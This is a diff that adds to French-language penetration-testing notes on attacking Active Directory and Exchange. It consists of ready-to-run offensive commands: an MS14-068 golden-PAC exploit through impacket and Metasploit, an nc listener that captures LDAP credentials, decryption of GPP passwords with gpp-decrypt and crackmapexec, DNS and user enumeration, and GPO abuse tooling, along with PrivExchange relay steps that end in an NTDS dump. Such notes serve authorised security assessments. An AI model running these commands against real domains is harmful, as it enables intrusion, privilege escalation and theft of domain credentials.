@@ -10,7 +10,6 @@ Donc utilisable par un utilisateur avec les droits DCSync
 Focus le groupe "Organization Management" --> full control sur MS Exchange Sec Groups
 Ajouter les utilisateurs de notre choix dans l'OU.
 
-
 #PrivExchange Attack
 
 N'importe quel user avec une boite mail peut forcer le server exchange à authentifier
@@ -18,6 +17,30 @@ N'importe quel user avec une boite mail peut forcer le server exchange à authen
 --> Relay vers LDAP puis dump de la base NTDS
 
 #Printer Bug
+Cf. Unconstrained Delegation Exploit
+Import-Module ./SecurityAssessment.ps1
+Get-SpoolStatus -ComputerName <FQDN>
 
+#MS14-068
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
+OU
+impacket-goldenPac <DOMAIN_FQDN>/<USER>:<PASS>@<DC_FQDN> dc-ip <dc_ip>
+errors informations: msf6> use admin/kerberos/ms14_068_kerberos_checksum
 
+#Sniffing LDAP Creds
+sudo nc -k -v -l -p 389
 
+#Enumération des entrées DNS
+adidnsdump -u <DOMAIN>\\<USER> ldap://<dc_ip>
+
+#Toujours checker les descriptions des users
+Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
+
+#GPP
+Quand une GPP est créée, un fichier .xml est crée dans le share SYSVOL
+Enum manuelle puis decrypt: gpp-decrypt <crypt_pass>
+Enum auto: crackmapexec smb <dc_ip> -u <USER> -p <PASS> -M gpp_autologin
+
+#Checker les droits sur les GPO
+Soit via bloodhound
+Soit via SharpGPOAbuse
